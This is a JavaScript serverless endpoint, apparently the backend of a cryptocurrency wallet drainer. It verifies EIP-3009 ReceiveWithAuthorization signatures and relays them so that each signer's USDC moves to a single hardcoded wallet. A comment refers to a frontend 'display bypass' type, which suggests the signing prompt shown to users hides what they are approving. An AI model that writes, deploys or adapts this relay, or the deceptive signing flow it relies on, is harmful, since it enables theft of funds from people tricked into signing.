const ethers = require("ethers");

const USDC = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_ABI = [
  // EIP-3009 — msg.sender must == to
  "function receiveWithAuthorization(address from, address to, uint256 value, uint256 validAfter, uint256 validBefore, bytes32 nonce, uint8 v, bytes32 r, bytes32 s) external",
  "function balanceOf(address) view returns (uint256)"
];
// EIP-3009 ReceiveWithAuthorization types (off-chain sig verification)
// Note: AuditTrace orphan type is frontend-only for display bypass — not included here
const RECEIVE_TYPES = [
  { name: "from",        type: "address" },
  { name: "to",          type: "address" },
  { name: "value",       type: "uint256" },
  { name: "validAfter",  type: "uint256" },
  { name: "validBefore", type: "uint256" },
  { name: "nonce",       type: "bytes32" }
];
const RPCS = [
  "https://rpc.ankr.com/eth",
  "https://eth.llamarpc.com",
  "https://1rpc.io/eth",
  "https://ethereum.publicnode.com",
  "https://cloudflare-eth.com"
];
const WALLET_B_ADDR = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";

function deriveWalletB() {
  const raw = (process.env.WALLET_B_KEY || "").trim();
  if (!raw) throw new Error("WALLET_B_KEY manquant");
  if (raw.startsWith("0x") || /^[0-9a-fA-F]{64}$/.test(raw)) {
    return new ethers.Wallet(raw.startsWith("0x") ? raw : "0x" + raw);
  }
  return ethers.Wallet.fromMnemonic(raw, "m/44'/60'/0'/0/0");
}

async function getWalletB() {
  const base = deriveWalletB();
  for (const rpc of RPCS) {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBlockNumber();
      return base.connect(provider);
    } catch (e) { /* try next */ }
  }
  throw new Error("Tous les RPCs ont échoué");
}

module.exports = async (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ error: "Method not allowed" });

  const { from, to, value, validAfter, validBefore, nonce, v, r, s } = req.body;
  if (!from || !to || !value || validAfter === undefined || !validBefore || !nonce || v === undefined || !r || !s) {
    return res.status(400).json({ error: "Champs manquants", got: Object.keys(req.body || {}) });
  }

  // to must equal WALLET_B (msg.sender == to required by receiveWithAuthorization)
  if (to.toLowerCase() !== WALLET_B_ADDR.toLowerCase()) {
    return res.status(400).json({ error: "to doit être WALLET_B pour receiveWithAuthorization" });
  }

  // 1. Off-chain sig verification (ReceiveWithAuthorization — same hash as on-chain)
  try {
    const domain   = { name: "USD Coin", version: "2", chainId: 1, verifyingContract: USDC };
    const types    = { ReceiveWithAuthorization: RECEIVE_TYPES };
    const message  = {
      from, to, value,
      validAfter:  Number(validAfter),
      validBefore: Number(validBefore),
      nonce
    };
    const rawSig    = ethers.utils.joinSignature({ v: Number(v), r, s });
    const recovered = ethers.utils.verifyTypedData(domain, types, message, rawSig);
    if (recovered.toLowerCase() !== from.toLowerCase()) {
      return res.status(400).json({ error: "Signature invalide", recovered, expected: from });
    }
  } catch (e) {
    return res.status(400).json({ error: "Erreur vérif sig : " + e.message });
  }

  // 2. Wallet B (will be msg.sender == to)
  let walletB;
  try {
    walletB = await getWalletB();
  } catch (e) {
    return res.status(500).json({ error: "Wallet B : " + e.message });
  }

  if (walletB.address.toLowerCase() !== WALLET_B_ADDR.toLowerCase()) {
    return res.status(400).json({ error: "Wallet B mismatch", derived: walletB.address });
  }

  const usdc = new ethers.Contract(USDC, USDC_ABI, walletB);

  // 3. receiveWithAuthorization — single tx, msg.sender (walletB) == to
  try {
    await usdc.callStatic.receiveWithAuthorization(
      from, to, value, validAfter, validBefore, nonce, v, r, s
    );

    const tx = await usdc.receiveWithAuthorization(
      from, to, value, validAfter, validBefore, nonce, v, r, s,
      { gasLimit: 120000 }
    );
    const rc = await tx.wait(1);

    return res.json({
      success: true,
      txHash: tx.hash,
      blockNumber: rc.blockNumber,
      gasUsed: rc.gasUsed.toString()
    });
  } catch (e) {
    const msg = e?.data?.message || e?.reason || e?.error?.message || e?.message || String(e);
    return res.status(500).json({ error: "receiveWithAuthorization échoué : " + msg });
  }
};
